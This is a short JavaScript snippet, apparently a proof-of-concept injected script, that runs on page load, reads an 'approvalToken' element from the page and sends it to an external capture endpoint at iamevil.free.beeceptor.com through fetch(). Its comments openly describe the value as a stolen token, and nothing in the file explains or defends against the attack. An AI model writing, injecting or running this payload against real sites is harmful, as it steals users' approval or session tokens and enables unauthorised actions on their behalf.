window.onload = function() {
    // Get the approval token from the page
    var approvalToken = document.getElementById('approvalToken').innerText;

    // Send the stolen token to Beeceptor using fetch
    fetch('https://iamevil.free.beeceptor.com/?token=' + encodeURIComponent(approvalToken))
        .then(response => response.text())
        .then(data => console.log('Token sent to Beeceptor:', data))
        .catch(error => console.error('Error sending token to Beeceptor:', error));
};
